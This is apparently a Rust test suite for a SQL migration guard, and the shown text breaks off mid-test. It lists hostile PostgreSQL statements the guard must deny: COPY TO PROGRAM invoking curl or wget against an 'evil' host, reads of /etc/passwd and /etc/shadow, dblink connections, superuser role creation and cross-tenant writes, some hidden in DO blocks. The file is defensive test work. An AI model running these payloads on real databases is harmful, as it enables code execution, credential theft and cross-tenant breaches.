//! The SQL security guard attack-vector matrix — the security heart (Task 4).
//!
//! Migrations are privileged arbitrary-SQL authored by untrusted creators AND
//! a prompt-injectable AI (design §1.1). The guard is the parse-time first line
//! of defense-in-depth (the least-priv `migrator` role, built later, is the
//! second). Every vector below MUST be denied; the positive controls MUST pass;
//! destructive ops MUST pass but be *flagged* (the gate decides on data loss).
//!
//! The matrix is deliberately exhaustive and goes beyond the plan's list:
//! every RCE / priv-esc / cross-tenant / file-access / SSRF vector we could
//! think of, plus the same vectors nested inside `DO $$…$$` and function
//! bodies (which the guard must inspect, not just top-level statements).

use zeroship_migrate::guard::{flags_for, GuardConfig, GuardError, SqlGuard};

/// A guard whose project schema is `project_acme` and which allowlists only
/// `pgcrypto` + `uuid-ossp` extensions — a realistic per-project config.
fn guard() -> SqlGuard {
    SqlGuard::new(GuardConfig {
        project_schema: "project_acme".to_string(),
        extension_allowlist: vec!["pgcrypto".to_string(), "uuid-ossp".to_string()],
    })
}

/// Assert the SQL is denied (either `Denied` or `CrossSchema`).
#[track_caller]
fn assert_denied(sql: &str) {
    match guard().check(sql) {
        Err(GuardError::Denied { .. } | GuardError::CrossSchema { .. }) => {}
        Err(GuardError::Parse(e)) => panic!("expected Denied, got Parse({e:?}) for: {sql}"),
        Ok(report) => panic!("expected DENY but PASSED for: {sql}\n  report: {report:?}"),
    }
}

/// Assert the SQL is denied specifically as a cross-schema violation.
#[track_caller]
fn assert_cross_schema(sql: &str) {
    match guard().check(sql) {
        Err(GuardError::CrossSchema { .. }) => {}
        other => panic!("expected CrossSchema for: {sql}\n  got: {other:?}"),
    }
}

/// Assert the SQL passes the guard.
#[track_caller]
fn assert_ok(sql: &str) -> zeroship_migrate::guard::GuardReport {
    match guard().check(sql) {
        Ok(report) => report,
        other => panic!("expected OK for: {sql}\n  got: {other:?}"),
    }
}

// ---------------------------------------------------------------------------
// RCE — COPY … PROGRAM (shell execution)
// ---------------------------------------------------------------------------

#[test]
fn copy_to_program_is_rce_denied() {
    assert_denied("COPY project_acme.t TO PROGRAM 'sh -c \"curl evil\"'");
}

#[test]
fn copy_from_program_is_rce_denied() {
    assert_denied("COPY project_acme.t FROM PROGRAM 'wget http://evil/x'");
}

#[test]
fn copy_to_file_is_filesystem_denied() {
    // COPY … TO/FROM a server file is filesystem access, also privileged.
    assert_denied("COPY project_acme.t TO '/etc/cron.d/evil'");
    assert_denied("COPY project_acme.t FROM '/etc/passwd'");
}

#[test]
fn copy_to_stdout_is_allowed() {
    // COPY … TO STDOUT is the client-streaming form — no file, no program.
    assert_ok("COPY project_acme.t TO STDOUT");
}

// ---------------------------------------------------------------------------
// RCE — untrusted procedural languages + LANGUAGE C
// ---------------------------------------------------------------------------

#[test]
fn create_function_plpythonu_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE plpythonu AS 'import os'");
}

#[test]
fn create_function_plpython3u_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE plpython3u AS 'import os'");
}

#[test]
fn create_function_plperlu_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE plperlu AS 'system(\"id\")'");
}

#[test]
fn create_function_pltclu_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE pltclu AS 'exec id'");
}

#[test]
fn create_function_language_c_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS int LANGUAGE c AS 'evil.so', 'sym'");
}

#[test]
fn create_function_internal_denied() {
    // LANGUAGE internal can expose internal symbols — untrusted authors must not.
    assert_denied("CREATE FUNCTION f() RETURNS int LANGUAGE internal AS 'int4pl'");
}

#[test]
fn create_trusted_plpgsql_function_is_allowed() {
    assert_ok(
        "CREATE FUNCTION project_acme.bump() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN RETURN NEW; END $$",
    );
}

#[test]
fn create_sql_function_is_allowed() {
    assert_ok("CREATE FUNCTION project_acme.one() RETURNS int LANGUAGE sql AS 'SELECT 1'");
}

// ---------------------------------------------------------------------------
// RCE / SSRF / file — dangerous CREATE EXTENSION (allowlist enforcement)
// ---------------------------------------------------------------------------

#[test]
fn create_extension_dblink_denied() {
    assert_denied("CREATE EXTENSION dblink");
}

#[test]
fn create_extension_postgres_fdw_denied() {
    assert_denied("CREATE EXTENSION postgres_fdw");
}

#[test]
fn create_extension_file_fdw_denied() {
    assert_denied("CREATE EXTENSION file_fdw");
}

#[test]
fn create_extension_plpythonu_denied() {
    assert_denied("CREATE EXTENSION plpythonu");
}

#[test]
fn create_extension_not_in_allowlist_denied() {
    // Anything not explicitly allowlisted is denied — deny by default.
    assert_denied("CREATE EXTENSION hstore");
    assert_denied("CREATE EXTENSION \"uuid-ossp\" SCHEMA public; CREATE EXTENSION adminpack");
}

#[test]
fn create_allowlisted_extension_is_allowed() {
    assert_ok("CREATE EXTENSION pgcrypto");
    assert_ok("CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\"");
}

// ---------------------------------------------------------------------------
// Privilege escalation — ALTER SYSTEM, roles, grants
// ---------------------------------------------------------------------------

#[test]
fn alter_system_denied() {
    assert_denied("ALTER SYSTEM SET shared_preload_libraries = 'evil'");
    assert_denied("ALTER SYSTEM RESET ALL");
}

#[test]
fn create_role_denied() {
    assert_denied("CREATE ROLE evil");
    assert_denied("CREATE ROLE evil SUPERUSER LOGIN PASSWORD 'x'");
    assert_denied("CREATE USER evil");
}

#[test]
fn alter_role_superuser_denied() {
    assert_denied("ALTER ROLE app_role SUPERUSER");
    assert_denied("ALTER ROLE app_role WITH CREATEROLE");
    assert_denied("ALTER USER app_role PASSWORD 'x'");
}

#[test]
fn drop_role_denied() {
    assert_denied("DROP ROLE app_role");
}

#[test]
fn grant_denied() {
    assert_denied("GRANT SELECT ON project_acme.t TO evil");
    assert_denied("GRANT ALL ON ALL TABLES IN SCHEMA project_acme TO PUBLIC");
}

#[test]
fn grant_role_membership_denied() {
    assert_denied("GRANT pg_read_server_files TO app_role");
    assert_denied("GRANT pg_execute_server_program TO app_role");
    assert_denied("GRANT app_role TO evil");
}

#[test]
fn revoke_denied() {
    // REVOKE is privilege management too — the migrator must not touch ACLs.
    assert_denied("REVOKE ALL ON project_acme.t FROM PUBLIC");
}

#[test]
fn alter_default_privileges_denied() {
    assert_denied(
        "ALTER DEFAULT PRIVILEGES IN SCHEMA project_acme GRANT SELECT ON TABLES TO PUBLIC",
    );
}

// ---------------------------------------------------------------------------
// Cross-tenant — referencing schemas outside the project schema
// ---------------------------------------------------------------------------

#[test]
fn select_control_schema_is_cross_schema() {
    assert_cross_schema("SELECT * FROM control.creator_billing");
}

#[test]
fn insert_auth_schema_is_cross_schema() {
    assert_cross_schema("INSERT INTO auth.users(id) VALUES ('x')");
}

#[test]
fn drop_other_project_schema_is_denied() {
    // DROP SCHEMA is outside a project migrator's remit entirely (schema
    // lifecycle is the platform's, not the creator's): denied-by-default as an
    // unrecognized/unsafe construct (was previously surfaced as CrossSchema).
    assert_denied("DROP SCHEMA project_other CASCADE");
}

#[test]
fn create_table_in_foreign_schema_is_cross_schema() {
    assert_cross_schema("CREATE TABLE control.evil(id int)");
}

#[test]
fn update_billing_schema_is_cross_schema() {
    assert_cross_schema("UPDATE billing.invoices SET amount = 0");
}

#[test]
fn join_into_foreign_schema_is_cross_schema() {
    assert_cross_schema(
        "SELECT * FROM project_acme.orders o JOIN control.creator_billing b ON b.id = o.cid",
    );
}

#[test]
fn cte_referencing_foreign_schema_is_cross_schema() {
    assert_cross_schema(
        "WITH x AS (SELECT * FROM auth.users) SELECT * FROM x",
    );
}

#[test]
fn own_schema_qualified_is_allowed() {
    assert_ok("SELECT * FROM project_acme.orders");
    assert_ok("CREATE TABLE project_acme.orders(id int primary key)");
}

#[test]
fn unqualified_object_is_allowed() {
    // Unqualified names resolve via the pinned search_path = project schema;
    // they carry no explicit foreign schema, so the parse check passes (the
    // DB-privilege layer + pinned search_path confine them at runtime).
    assert_ok("CREATE TABLE products(id int primary key)");
    assert_ok("SELECT * FROM products");
}

// ---------------------------------------------------------------------------
// File access — server-side file functions + large objects
// ---------------------------------------------------------------------------

#[test]
fn pg_read_file_denied() {
    assert_denied("SELECT pg_read_file('/etc/passwd')");
}

#[test]
fn pg_read_binary_file_denied() {
    assert_denied("SELECT pg_read_binary_file('/etc/shadow')");
}

#[test]
fn pg_ls_dir_denied() {
    assert_denied("SELECT pg_ls_dir('/')");
}

#[test]
fn lo_import_export_denied() {
    assert_denied("SELECT lo_import('/etc/passwd')");
    assert_denied("SELECT lo_export(1234, '/tmp/leak')");
}

#[test]
fn grant_file_access_roles_denied() {
    assert_denied("GRANT pg_read_server_files TO app_role");
    assert_denied("GRANT pg_write_server_files TO app_role");
}

// ---------------------------------------------------------------------------
// SSRF / reach-other-DBs — dblink functions
// ---------------------------------------------------------------------------

#[test]
fn dblink_connect_denied() {
    assert_denied("SELECT dblink_connect('host=evil dbname=control')");
}

#[test]
fn dblink_exec_denied() {
    assert_denied("SELECT dblink_exec('conn', 'DROP TABLE x')");
}

#[test]
fn dblink_query_denied() {
    assert_denied("SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)");
}

// ---------------------------------------------------------------------------
// search_path escape
// ---------------------------------------------------------------------------

#[test]
fn set_search_path_denied() {
    assert_denied("SET search_path TO control");
    assert_denied("SET search_path = control, public");
    assert_denied("SET LOCAL search_path TO auth");
}

#[test]
fn set_role_denied() {
    assert_denied("SET ROLE postgres");
    assert_denied("SET SESSION AUTHORIZATION postgres");
}

#[test]
fn set_benign_param_allowed() {
    // A benign SET (e.g. a typed-value GUC the migration legitimately needs)
    // is fine — only search_path/role/authorization escapes are denied.
    assert_ok("SET statement_timeout = '5s'");
}

// ---------------------------------------------------------------------------
// Nested inside DO blocks + function bodies — the must-inspect-bodies cases
// ---------------------------------------------------------------------------

#[test]
fn do_block_with_copy_program_denied() {
    assert_denied(
        "DO $$ BEGIN COPY project_acme.t TO PROGRAM 'sh'; END $$",
    );
}

#[test]
fn do_block_with_dblink_denied() {
    assert_denied(
        "DO $$ BEGIN PERFORM dblink_connect('host=evil'); END $$ LANGUAGE plpgsql",
    );
}

#[test]
fn do_block_with_pg_read_file_denied() {
    assert_denied(
        "DO $$ BEGIN PERFORM pg_read_file('/etc/passwd'); END $$",
    );
}

#[test]
fn do_block_with_cross_schema_denied() {
    assert_denied(
        "DO $$ BEGIN INSERT INTO control.creator_billing VALUES (1); END $$",
    );
}

#[test]
fn do_block_with_alter_system_denied() {
    assert_denied("DO $$ BEGIN EXECUTE 'ALTER SYSTEM SET x = 1'; END $$");
}

#[test]
fn do_block_with_set_search_path_denied() {
    assert_denied("DO $$ BEGIN EXECUTE 'SET search_path TO control'; END $$");
}

#[test]
fn do_block_with_create_role_denied() {
    assert_denied("DO $$ BEGIN EXECUTE 'CREATE ROLE evil SUPERUSER'; END $$");
}

#[test]
fn sql_function_body_with_copy_program_denied() {
    // A SQL-language function whose body contains a denied construct.
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE sql AS $$ COPY project_acme.t TO PROGRAM 'sh' $$",
    );
}

#[test]
fn plpgsql_function_body_with_dblink_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN PERFORM dblink('host=evil','SELECT 1'); END $$",
    );
}

#[test]
fn plpgsql_function_body_with_cross_schema_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN DELETE FROM auth.users; END $$",
    );
}

#[test]
fn benign_plpgsql_function_body_is_allowed() {
    assert_ok(
        "CREATE FUNCTION project_acme.touch() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN NEW.updated_at = now(); RETURN NEW; END $$",
    );
}

// ---------------------------------------------------------------------------
// CALL of a procedure can run arbitrary statements — treat as body-bearing
// ---------------------------------------------------------------------------

#[test]
fn unparseable_sql_is_denied_not_panicked() {
    // Deny-by-default: SQL the parser rejects never reaches the DB.
    match guard().check("this is &^% not valid sql") {
        Err(GuardError::Parse(_) | GuardError::Denied { .. }) => {}
        other => panic!("unparseable SQL must be rejected, got {other:?}"),
    }
}

// ===========================================================================
// ADVERSARIAL BYPASS REGRESSION MATRIX (31 confirmed bypasses + class coverage)
//
// Each test below reproduces a bypass the adversarial critic proved against the
// allow-by-default guard. They were RED (passed-through) before the
// deny-by-default + full-tree-walk + non-RangeVar-schema rework; they MUST now
// be denied. Grouped by root cause / class so a reviewer can see the *classes*
// are closed, not just the named strings.
// ===========================================================================

/// Assert the SQL is denied. The deny-by-default catch-all rule is
/// `unrecognized_dangerous_construct`, but a more-specific rule (or a
/// cross-schema verdict) firing first is equally acceptable — the contract is
/// "this must not pass". Use [`assert_denied`] semantics with a clearer name
/// at the call sites that exercise the deny-by-default class.
#[track_caller]
fn assert_denied_unrecognized(sql: &str) {
    match guard().check(sql) {
        Err(GuardError::Denied { .. } | GuardError::CrossSchema { .. }) => {}
        other => panic!("expected DENY for: {sql}\n  got: {other:?}"),
    }
}

// --- GROUP 1: unhandled statement kinds → deny-by-default ------------------

#[test]
fn deny_by_default_emits_unrecognized_rule() {
    // Proves the inversion: an unenumerated statement kind is denied by the
    // catch-all `unrecognized_dangerous_construct` rule, not waved through.
    for sql in [
        "CALL some_proc()",
        "CREATE PUBLICATION p FOR ALL TABLES",
        "PREPARE TRANSACTION 'gid'",
        "ALTER EXTENSION pgcrypto UPDATE",
        "REASSIGN OWNED BY r TO postgres",
    ] {
        match guard().check(sql) {
            Err(GuardError::Denied { rule, .. }) => assert_eq!(
                rule, "unrecognized_dangerous_construct",
                "expected deny-by-default rule for: {sql}"
            ),
            other => panic!("expected deny-by-default for: {sql}\n  got: {other:?}"),
        }
    }
}

#[test]
fn call_procedure_denied() {
    assert_denied_unrecognized("CALL control.f(1)");
    assert_denied_unrecognized("CALL some_proc()");
}

#[test]
fn create_event_trigger_denied() {
    assert_denied_unrecognized(
        "CREATE EVENT TRIGGER et ON ddl_command_start EXECUTE FUNCTION f()",
    );
}

#[test]
fn create_subscription_denied() {
    assert_denied_unrecognized(
        "CREATE SUBSCRIPTION s CONNECTION 'host=evil dbname=control' PUBLICATION p",
    );
}

#[test]
fn create_publication_denied() {
    assert_denied_unrecognized("CREATE PUBLICATION p FOR ALL TABLES");
}

#[test]
fn import_foreign_schema_denied() {
    assert_denied(
        "IMPORT FOREIGN SCHEMA remote LIMIT TO (t) FROM SERVER srv INTO project_acme",
    );
}

#[test]
fn create_cast_denied() {
    assert_denied_unrecognized("CREATE CAST (int AS text) WITH FUNCTION f(int)");
}

#[test]
fn create_transform_denied() {
    assert_denied_unrecognized(
        "CREATE TRANSFORM FOR int LANGUAGE sql (FROM SQL WITH FUNCTION f(internal))",
    );
}

#[test]
fn create_access_method_denied() {
    assert_denied_unrecognized("CREATE ACCESS METHOD am TYPE INDEX HANDLER h");
}

#[test]
fn prepare_statement_denied() {
    assert_denied_unrecognized("PREPARE p AS INSERT INTO control.audit VALUES(1)");
}

#[test]
fn prepare_transaction_denied() {
    assert_denied_unrecognized("PREPARE TRANSACTION 'gid'");
}

#[test]
fn reassign_owned_denied() {
    assert_denied_unrecognized("REASSIGN OWNED BY r TO postgres");
}

#[test]
fn drop_owned_denied() {
    assert_denied_unrecognized("DROP OWNED BY r");
}

#[test]
fn alter_extension_denied() {
    assert_denied_unrecognized("ALTER EXTENSION pgcrypto UPDATE");
}

#[test]
fn security_label_denied() {
    assert_denied_unrecognized("SECURITY LABEL ON TABLE project_acme.t IS 'x'");
}

#[test]
fn create_server_denied() {
    // FDW server creation is the SSRF/reach-other-DB setup primitive.
    assert_denied("CREATE SERVER srv FOREIGN DATA WRAPPER postgres_fdw");
}

#[test]
fn create_foreign_data_wrapper_denied() {
    assert_denied("CREATE FOREIGN DATA WRAPPER fdw");
}

#[test]
fn listen_notify_denied() {
    assert_denied_unrecognized("LISTEN chan");
    assert_denied_unrecognized("NOTIFY chan");
}

#[test]
fn lock_table_denied() {
    // Out of remit (DoS primitive); not on the safe migration list.
    assert_denied_unrecognized("LOCK TABLE project_acme.t IN ACCESS EXCLUSIVE MODE");
}

// --- GROUP 2: cross-tenant via non-RangeVar schema slots -------------------

#[test]
fn alter_table_set_schema_to_control_denied() {
    // AlterObjectSchemaStmt.newschema — not a RangeVar; full-tree schema walk
    // must read it. (SET SCHEMA itself is also out of remit.)
    assert_denied("ALTER TABLE project_acme.t SET SCHEMA control");
}

#[test]
fn create_schema_denied() {
    // CreateSchemaStmt.schemaname — schema lifecycle is not a migrator's remit.
    assert_denied("CREATE SCHEMA control");
    assert_denied("CREATE SCHEMA project_acme");
}

#[test]
fn comment_on_control_table_is_cross_schema() {
    // CommentStmt.object is a qualified [schema, object] String list.
    assert_cross_schema("COMMENT ON TABLE control.secrets IS 'pwned'");
}

#[test]
fn comment_on_own_table_is_allowed() {
    assert_ok("COMMENT ON TABLE project_acme.orders IS 'order rows'");
}

#[test]
fn trigger_executing_control_function_is_cross_schema() {
    // CreateTrigStmt.funcname is a String list [schema, func]; the func's
    // schema must be checked.
    assert_cross_schema(
        "CREATE TRIGGER tr AFTER INSERT ON project_acme.t FOR EACH ROW EXECUTE FUNCTION control.exfil()",
    );
}

#[test]
fn trigger_with_own_schema_function_is_allowed() {
    assert_ok(
        "CREATE TRIGGER tr AFTER INSERT ON project_acme.t FOR EACH ROW EXECUTE FUNCTION project_acme.bump()",
    );
}

#[test]
fn alter_table_inherit_control_parent_denied() {
    // INHERIT target is a RangeVar nested in an AlterTableCmd.def; the
    // subcommand is also out of the safe set.
    assert_denied("ALTER TABLE project_acme.t INHERIT control.parent");
}

#[test]
fn alter_table_owner_to_postgres_denied() {
    // AtChangeOwner subcommand — privilege transfer, out of safe set.
    assert_denied("ALTER TABLE project_acme.t OWNER TO postgres");
}

#[test]
fn alter_function_owner_to_postgres_denied() {
    // ALTER FUNCTION … OWNER TO parses to AlterOwnerStmt — not on the safe
    // list → denied by default (ownership transfer to a privileged role).
    assert_denied("ALTER FUNCTION project_acme.f() OWNER TO postgres");
}

#[test]
fn alter_type_owner_to_postgres_denied() {
    // AlterOwnerStmt for a type — denied by default.
    assert_denied("ALTER TYPE project_acme.mood OWNER TO postgres");
}

#[test]
fn alter_view_owner_to_postgres_denied() {
    // ALTER VIEW … OWNER TO parses to AlterTableStmt + AtChangeOwner → caught
    // by the ALTER TABLE subcommand allowlist.
    assert_denied("ALTER VIEW project_acme.v OWNER TO postgres");
}

#[test]
fn create_policy_denied() {
    assert_denied("CREATE POLICY p ON project_acme.t USING (true)");
}

// --- GROUP 3: CREATE RULE action subtree -----------------------------------

#[test]
fn create_rule_inserting_into_control_denied() {
    // CREATE RULE is outside the safe migration set (deny-by-default), so it is
    // denied wholesale — stronger than the cross-schema posture. The full-tree
    // schema walk independently reaches the control.audit RangeVar nested in
    // RuleStmt.actions (a slot pg_query::nodes() never recurses into).
    assert_denied(
        "CREATE RULE r AS ON INSERT TO project_acme.t DO ALSO INSERT INTO control.audit VALUES(1)",
    );
}

#[test]
fn create_rule_with_pg_read_file_denied() {
    assert_denied(
        "CREATE RULE r AS ON INSERT TO project_acme.t DO INSTEAD SELECT pg_read_file('/etc/passwd')",
    );
}

// --- GROUP 4: dangerous func in expr slots of recognized statements --------

#[test]
fn create_table_column_default_pg_read_file_denied() {
    // Column DEFAULT is a slot pg_query::nodes() skips → full-tree walk closes.
    assert_denied("CREATE TABLE project_acme.t (c text DEFAULT pg_read_file('/etc/passwd'))");
}

#[test]
fn create_table_default_subselect_pg_read_file_denied() {
    assert_denied(
        "CREATE TABLE project_acme.t (c int DEFAULT (SELECT pg_read_file('/x')::int))",
    );
}

#[test]
fn create_table_check_constraint_pg_read_file_denied() {
    assert_denied(
        "CREATE TABLE project_acme.t (c int CHECK (c < length(pg_read_file('/x'))))",
    );
}

#[test]
fn alter_column_set_default_pg_read_file_denied() {
    assert_denied(
        "ALTER TABLE project_acme.t ALTER COLUMN c SET DEFAULT pg_read_file('/x')",
    );
}

#[test]
fn insert_values_pg_read_file_denied() {
    // INSERT … VALUES(...) list is another slot the partial walk skipped.
    assert_denied("INSERT INTO project_acme.t VALUES (pg_read_file('/etc/passwd'))");
}

#[test]
fn update_set_dblink_denied() {
    assert_denied(
        "UPDATE project_acme.t SET c = dblink('host=evil','SELECT 1')",
    );
}

// --- GROUP 5: plpgsql runtime-constructed SQL ------------------------------

#[test]
fn do_block_format_identifier_to_control_denied() {
    // s := 'control'; EXECUTE format('UPDATE %I.creator_billing …', s) — the
    // target schema is a bare literal, not a schema.ident adjacency.
    assert_denied(
        "DO $$ DECLARE s text := 'control'; BEGIN EXECUTE format('UPDATE %I.creator_billing SET amount=0', s); END $$",
    );
}

#[test]
fn do_block_format_identifier_to_other_project_denied() {
    // format('%I.t', 'project_other') reaches another project's schema.
    assert_denied(
        "DO $$ BEGIN EXECUTE format('UPDATE %I.t SET x=0', 'project_other'); END $$",
    );
}

#[test]
fn plpgsql_function_format_identifier_to_control_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE plpgsql AS $$ DECLARE s text := 'auth'; BEGIN EXECUTE format('DELETE FROM %I.users', s); END $$",
    );
}

#[test]
fn benign_plpgsql_with_data_literal_is_allowed() {
    // A body with a plain data literal (no %I template, not a platform schema)
    // must NOT be falsely denied — guards against over-denial of group 5.
    assert_ok(
        "CREATE FUNCTION project_acme.g() RETURNS text LANGUAGE plpgsql AS $$ BEGIN RETURN 'active'; END $$",
    );
}

// --- GROUP 6: SECURITY DEFINER / search_path -------------------------------

#[test]
fn create_function_security_definer_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS int LANGUAGE sql SECURITY DEFINER AS 'SELECT 1'",
    );
}

#[test]
fn create_function_security_invoker_is_allowed() {
    // SECURITY INVOKER (the default, explicitly stated) is fine.
    assert_ok(
        "CREATE FUNCTION project_acme.f() RETURNS int LANGUAGE sql SECURITY INVOKER AS 'SELECT 1'",
    );
}

#[test]
fn create_function_set_search_path_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS int LANGUAGE sql SET search_path = control AS 'SELECT 1'",
    );
}

#[test]
fn alter_function_set_search_path_denied() {
    assert_denied("ALTER FUNCTION project_acme.f() SET search_path = control");
}

#[test]
fn alter_function_security_definer_denied() {
    assert_denied("ALTER FUNCTION project_acme.f() SECURITY DEFINER");
}

// --- Positive controls for the NEWLY-ADMITTED safe-list statement kinds ----
// (deny-by-default must still let legitimate migration DDL through)

#[test]
fn safe_create_view_passes() {
    assert_ok("CREATE VIEW project_acme.active AS SELECT * FROM project_acme.orders");
}

#[test]
fn safe_create_materialized_view_passes() {
    assert_ok("CREATE MATERIALIZED VIEW project_acme.mv AS SELECT 1");
}

#[test]
fn safe_create_enum_type_passes() {
    assert_ok("CREATE TYPE project_acme.mood AS ENUM ('happy','sad')");
}

#[test]
fn safe_alter_type_add_value_passes() {
    let r = assert_ok("ALTER TYPE project_acme.mood ADD VALUE 'meh'");
    assert!(
        r.classes.iter().any(|c| c.non_transactional),
        "ALTER TYPE ADD VALUE is non-transactional"
    );
}

#[test]
fn safe_create_composite_type_passes() {
    assert_ok("CREATE TYPE project_acme.point AS (x int, y int)");
}

#[test]
fn safe_create_sequence_passes() {
    assert_ok("CREATE SEQUENCE project_acme.s");
}

#[test]
fn safe_alter_sequence_passes() {
    assert_ok("ALTER SEQUENCE project_acme.s RESTART WITH 1000");
}

#[test]
fn safe_drop_view_passes() {
    assert_ok("DROP VIEW project_acme.active");
}

#[test]
fn safe_drop_index_concurrently_passes() {
    let r = assert_ok("DROP INDEX CONCURRENTLY project_acme.idx");
    assert!(
        r.classes.iter().any(|c| c.non_transactional),
        "DROP INDEX CONCURRENTLY is non-transactional"
    );
}

#[test]
fn safe_refresh_matview_passes() {
    assert_ok("REFRESH MATERIALIZED VIEW project_acme.mv");
}

#[test]
fn safe_drop_function_passes() {
    assert_ok("DROP FUNCTION project_acme.f()");
}

#[test]
fn safe_create_trigger_own_schema_passes() {
    assert_ok(
        "CREATE TRIGGER tr BEFORE UPDATE ON project_acme.t FOR EACH ROW EXECUTE FUNCTION project_acme.bump()",
    );
}

#[test]
fn safe_seed_insert_passes() {
    assert_ok("INSERT INTO project_acme.config(k, v) VALUES ('theme', 'dark')");
}

#[test]
fn safe_backfill_update_passes() {
    assert_ok("UPDATE project_acme.orders SET status = 'pending' WHERE status IS NULL");
}

#[test]
fn safe_begin_commit_passes() {
    assert_ok("BEGIN");
    assert_ok("COMMIT");
}

#[test]
fn safe_drop_type_passes() {
    assert_ok("DROP TYPE project_acme.mood");
}

#[test]
fn safe_rename_column_passes() {
    assert_ok("ALTER TABLE project_acme.t RENAME COLUMN a TO b");
}

// --- Full-tree-walk coverage in deeper expression slots --------------------

#[test]
fn expression_index_with_pg_read_file_denied() {
    assert_denied("CREATE INDEX i ON project_acme.t ((pg_read_file('/x')))");
}

#[test]
fn generated_column_with_pg_read_file_denied() {
    assert_denied(
        "CREATE TABLE project_acme.t (a int, b int GENERATED ALWAYS AS (length(pg_read_file('/x'))) STORED)",
    );
}

#[test]
fn merge_with_pg_read_file_denied() {
    assert_denied(
        "MERGE INTO project_acme.t USING project_acme.s ON true WHEN MATCHED THEN UPDATE SET c = pg_read_file('/x')",
    );
}

#[test]
fn create_table_as_into_control_is_cross_schema() {
    assert_cross_schema("CREATE TABLE control.x AS SELECT 1");
}

// --- Over-denial guards: neutral schemas / qualified builtins must PASS -----
// (the funcname full-tree walk must not false-positive on pg_catalog/public)

#[test]
fn qualified_pg_catalog_builtin_is_allowed() {
    assert_ok("SELECT pg_catalog.length('x')");
    assert_ok("CREATE TABLE project_acme.t (c int DEFAULT pg_catalog.abs(-1))");
}

#[test]
fn qualified_public_function_is_allowed() {
    // `public.fn(…)` qualification is routine (extensions install there);
    // a function-name qualifier to public must not be flagged cross-schema.
    assert_ok("SELECT public.gen_random_uuid()");
}

#[test]
fn own_schema_qualified_function_call_is_allowed() {
    assert_ok("SELECT project_acme.helper(1)");
}

// ---------------------------------------------------------------------------
// Positive controls — safe DDL must PASS, report ok
// ---------------------------------------------------------------------------

#[test]
fn safe_create_table_passes() {
    let r = assert_ok("CREATE TABLE products(id int primary key, name text, price numeric)");
    assert!(!r.destructive, "CREATE TABLE is not destructive");
}

#[test]
fn safe_add_column_passes() {
    let r = assert_ok("ALTER TABLE products ADD COLUMN sku text");
    assert!(!r.destructive);
}

#[test]
fn safe_create_index_concurrently_passes() {
    let r = assert_ok("CREATE INDEX CONCURRENTLY idx_sku ON products(sku)");
    assert!(!r.destructive);
    assert!(
        r.classes.iter().any(|c| c.non_transactional),
        "CONCURRENTLY must be flagged non-transactional in the report"
    );
}

#[test]
fn safe_add_constraint_passes() {
    assert_ok("ALTER TABLE products ADD CONSTRAINT chk_price CHECK (price >= 0)");
}

#[test]
fn safe_multi_statement_migration_passes() {
    assert_ok(
        "CREATE TABLE orders(id int primary key);
         ALTER TABLE orders ADD COLUMN total numeric;
         CREATE INDEX idx_total ON orders(total);",
    );
}

// ---------------------------------------------------------------------------
// Destructive — must PASS but report.destructive == true
// ---------------------------------------------------------------------------

#[test]
fn drop_table_passes_but_flagged_destructive() {
    let r = assert_ok("DROP TABLE products");
    assert!(r.destructive, "DROP TABLE must be flagged destructive (gate decides)");
}

#[test]
fn drop_column_passes_but_flagged_destructive() {
    let r = assert_ok("ALTER TABLE products DROP COLUMN sku");
    assert!(r.destructive, "DROP COLUMN must be flagged destructive");
}

#[test]
fn truncate_passes_but_flagged_destructive() {
    let r = assert_ok("TRUNCATE products");
    assert!(r.destructive, "TRUNCATE must be flagged destructive");
}

#[test]
fn alter_column_type_passes_but_flagged_destructive() {
    let r = assert_ok("ALTER TABLE products ALTER COLUMN price TYPE bigint");
    assert!(r.destructive, "type change is potentially-lossy → flagged");
}

#[test]
fn drop_constraint_passes_but_flagged_destructive() {
    let r = assert_ok("ALTER TABLE products DROP CONSTRAINT chk_price");
    assert!(r.destructive);
}

#[test]
fn mixed_migration_with_a_drop_is_flagged_but_passes() {
    // Additive + a drop: passes (no denied construct) but flagged destructive.
    let r = assert_ok(
        "CREATE TABLE t2(id int); DROP TABLE old_table;",
    );
    assert!(r.destructive);
}

// ---------------------------------------------------------------------------
// Task 5 — lint warnings + flags_for mapping
// ---------------------------------------------------------------------------

#[test]
fn add_not_null_volatile_default_warns_lock() {
    // ADD COLUMN NOT NULL DEFAULT <volatile> forces a full table rewrite under
    // an ACCESS EXCLUSIVE lock — lint must warn (not deny).
    let r = assert_ok("ALTER TABLE products ADD COLUMN created_at timestamptz NOT NULL DEFAULT now()");
    assert!(
        r.warnings.iter().any(|w| w.to_lowercase().contains("lock")
            || w.to_lowercase().contains("rewrite")),
        "expected a lock/rewrite warning, got: {:?}",
        r.warnings
    );
}

#[test]
fn add_not_null_constant_default_does_not_warn() {
    // A constant default is the PG11+ metadata-only fast path — no warning.
    let r = assert_ok("ALTER TABLE products ADD COLUMN active boolean NOT NULL DEFAULT true");
    assert!(
        !r.warnings.iter().any(|w| w.to_lowercase().contains("lock")),
        "constant default must not warn, got: {:?}",
        r.warnings
    );
}

#[test]
fn non_concurrent_create_index_warns() {
    // A plain CREATE INDEX takes a write lock for the build — warn to suggest
    // CONCURRENTLY.
    let r = assert_ok("CREATE INDEX idx_name ON products(name)");
    assert!(
        r.warnings.iter().any(|w| w.to_lowercase().contains("concurrently")),
        "expected a CONCURRENTLY suggestion, got: {:?}",
        r.warnings
    );
}

#[test]
fn concurrent_create_index_does_not_warn_concurrently() {
    let r = assert_ok("CREATE INDEX CONCURRENTLY idx_name ON products(name)");
    assert!(
